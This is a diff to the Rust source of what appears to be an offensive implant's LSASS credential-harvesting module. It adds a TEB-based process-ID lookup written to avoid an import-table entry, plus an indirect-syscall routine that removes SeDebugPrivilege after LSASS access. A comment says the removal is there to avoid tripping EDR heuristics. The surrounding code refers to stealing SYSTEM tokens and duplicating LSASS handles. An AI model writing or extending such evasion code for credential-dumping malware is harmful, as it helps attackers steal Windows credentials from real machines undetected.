@@ -29,6 +29,19 @@ use serde::Serialize;
 use std::ptr;
 use winapi::um::winnt::{HANDLE, PROCESS_VM_READ, PROCESS_QUERY_INFORMATION};
 
+// ── TEB-based PID (no IAT entry) ───────────────────────────────────────────
+
+/// Return the current process ID by reading the TEB directly.
+/// TEB is at GS:[0x30] on x86_64 Windows; ClientId.UniqueProcess is at +0x40.
+#[cfg(all(windows, target_arch = "x86_64"))]
+fn current_pid() -> u32 {
+    unsafe {
+        let teb: *mut u8;
+        std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);
+        ((teb as *const usize).add(0x40 / std::mem::size_of::<usize>())).read() as u32
+    }
+}
+
 // ── NTSTATUS helpers ───────────────────────────────────────────────────────
 
 #[inline]
@@ -830,6 +843,69 @@ fn enable_debug_privilege() -> Result<bool> {
     }
 }
 
+/// Disable SeDebugPrivilege on the current process token.
+///
+/// Uses the same indirect-syscall pattern as `enable_debug_privilege` but sets
+/// `SE_PRIVILEGE_REMOVED` to strip the privilege entirely from the token.
+fn disable_debug_privilege() -> Result<()> {
+    use winapi::um::winnt::{TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES};
+
+    let debug_luid = winapi::um::winnt::LUID { LowPart: 20, HighPart: 0 };
+
+    // Open current process token.
+    let current_process: HANDLE = (-1isize) as HANDLE;
+    let mut token: HANDLE = ptr::null_mut();
+    {
+        let target = crate::syscalls::get_syscall_id("NtOpenProcessToken")
+            .map_err(|e| anyhow!("NtOpenProcessToken SSN resolution: {e}"))?;
+        let status = unsafe {
+            crate::syscalls::do_syscall(
+                target.ssn,
+                target.gadget_addr,
+                &[
+                    current_process as u64,
+                    TOKEN_ADJUST_PRIVILEGES as u64,
+                    &mut token as *mut _ as u64,
+                ],
+            )
+        };
+        if !nt_success(status) {
+            return Err(anyhow!("NtOpenProcessToken failed: 0x{status:08X}"));
+        }
+    }
+
+    // Remove SeDebugPrivilege.
+    let mut tp: TOKEN_PRIVILEGES = unsafe { std::mem::zeroed() };
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = debug_luid;
+    tp.Privileges[0].Attributes = 0x00000004; // SE_PRIVILEGE_REMOVED
+
+    {
+        let target = crate::syscalls::get_syscall_id("NtAdjustPrivilegesToken")
+            .map_err(|e| anyhow!("NtAdjustPrivilegesToken SSN resolution: {e}"))?;
+        let status = unsafe {
+            crate::syscalls::do_syscall(
+                target.ssn,
+                target.gadget_addr,
+                &[
+                    token as u64,
+                    0u64,                                          // DisableAllPrivileges = FALSE
+                    &mut tp as *mut _ as u64,                      // NewState
+                    0u64,                                          // BufferLength
+                    ptr::null_mut::<u64>() as u64,                 // PreviousState
+                    ptr::null_mut::<u32>() as u64,                 // ReturnLength
+                ],
+            )
+        };
+        nt_close(token);
+        if !nt_success(status) {
+            Err(anyhow!("NtAdjustPrivilegesToken(SE_PRIVILEGE_REMOVED) failed: 0x{status:08X}"))
+        } else {
+            Ok(())
+        }
+    }
+}
+
 /// Revert privilege changes.
 fn revert_privileges(ctx: &PrivilegeContext) {
     // If we applied a cached impersonation token, auto-revert handles it
@@ -842,9 +918,16 @@ fn revert_privileges(ctx: &PrivilegeContext) {
     if ctx.stole_system_token {
         let _ = crate::token_manipulation::rev2self();
     }
-    // If we enabled SeDebugPrivilege ourselves, we could disable it here.
-    // In practice, leaving it enabled for the rest of the agent's lifetime
-    // is low-risk since the agent already runs elevated.
+
+    // Revert SeDebugPrivilege if we enabled it ourselves.
+    // A process with SeDebugPrivilege enabled is an immediate EDR heuristic
+    // trigger — always revert after LSASS access.
+    if ctx.debug_priv_enabled_by_us {
+        match disable_debug_privilege() {
+            Ok(()) => log::debug!("lsass_harvest: SeDebugPrivilege reverted"),
+            Err(e) => log::warn!("lsass_harvest: failed to revert SeDebugPrivilege: {e:#}"),
+        }
+    }
 }
 
 // ── LSASS process location ─────────────────────────────────────────────────
@@ -1029,7 +1112,7 @@ fn duplicate_existing_lsass_handle(lsass_pid: u32) -> Result<HANDLE> {
         return Err(anyhow!("handle information buffer truncated"));
     }
 
-    let our_pid = unsafe { winapi::um::processthreadsapi::GetCurrentProcessId() };
+    let our_pid = current_pid();
 
     for i in 0..count {
         let entry_offset = entries_start + i * entry_size;
